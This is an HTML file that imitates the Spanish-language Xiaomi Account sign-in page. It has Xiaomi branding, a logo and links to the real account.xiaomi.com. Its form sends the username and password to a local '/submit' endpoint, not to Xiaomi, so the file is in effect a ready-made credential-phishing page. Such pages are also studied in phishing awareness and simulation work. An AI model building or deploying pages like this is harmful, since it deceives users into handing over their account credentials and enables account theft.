<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Xiaomi Account</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
        body { 
            font-family: 'Inter', sans-serif; 
            background-color: #f9f9f9; 
        }
        /* Color naranja oficial de Xiaomi */
        .mi-orange {
            background-color: #ff6700;
        }
        .mi-orange:hover {
            background-color: #e65c00;
        }
        .mi-text-orange {
            color: #ff6700;
        }
        /* Estilo de los inputs de Xiaomi */
        .mi-input {
            background-color: #f0f0f0;
            border: 1px solid transparent;
            transition: all 0.2s;
        }
        .mi-input:focus {
            background-color: #fff;
            border: 1px solid #ff6700;
            outline: none;
        }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen">

    <div class="bg-white w-full max-w-[450px] p-8 md:p-10 shadow-sm border border-gray-100 rounded-lg">
        
        <div class="flex justify-center mb-6">
            <div class="w-12 h-12 mi-orange rounded-2xl flex items-center justify-center shadow-sm">
                <div class="border-2 border-white w-6 h-6 rounded-sm relative">
                    <div class="absolute bg-white w-0.5 h-3 left-1/2 top-1.5 -translate-x-1/2"></div>
                </div>
            </div>
        </div>

        <h1 class="text-2xl font-bold text-center text-[#333] mb-2">Xiaomi Account</h1>
        <p class="text-gray-500 text-center text-sm mb-8">Inicia sesión con tu cuenta Mi</p>

        <form action="/submit" method="POST" class="space-y-4">
            
            <div>
                <input type="text" name="username" required
                    class="mi-input w-full px-4 py-3 rounded-xl text-gray-800 placeholder-gray-400"
                    placeholder="Email/Teléfono/Cuenta Mi">
            </div>

            <div>
                <input type="password" name="password" required
                    class="mi-input w-full px-4 py-3 rounded-xl text-gray-800 placeholder-gray-400"
                    placeholder="Contraseña">
            </div>

            <button type="submit" 
                class="w-full mi-orange text-white font-bold py-3 rounded-xl transition-all shadow-md mt-2">
                Iniciar sesión
            </button>
        </form>

        <div class="mt-6 flex justify-between text-sm">
            <a href="https://account.xiaomi.com" target="_blank" class="mi-text-orange hover:underline font-medium">¿Olvidaste tu contraseña?</a>
            <a href="https://account.xiaomi.com" target="_blank" class="text-gray-400 hover:text-gray-600">Ayuda</a>
        </div>

        <div class="relative flex py-8 items-center">
            <div class="flex-grow border-t border-gray-200"></div>
            <span class="flex-shrink mx-4 text-gray-400 text-xs uppercase tracking-widest">Otras opciones</span>
            <div class="flex-grow border-t border-gray-200"></div>
        </div>

        <div class="space-y-3">
            <a href="https://account.xiaomi.com" target="_blank"
                class="block w-full text-center border border-gray-300 text-gray-700 font-semibold py-3 rounded-xl hover:bg-gray-50 transition">
                Crear cuenta
            </a>
            
            <div class="flex gap-4 justify-center mt-4">
                <img src="https://www.facebook.com/favicon.ico" class="w-6 h-6 grayscale opacity-60 hover:grayscale-0 cursor-pointer" alt="FB">
                <img src="https://www.google.com/favicon.ico" class="w-6 h-6 grayscale opacity-60 hover:grayscale-0 cursor-pointer" alt="G">
            </div>
        </div>
    </div>

    <div class="absolute bottom-6 flex gap-4 text-gray-400 text-xs">
        <a href="#" class="hover:text-gray-600">Privacidad</a>
        <span>|</span>
        <a href="#" class="hover:text-gray-600">Términos de uso</a>
    </div>

</body>
</html>
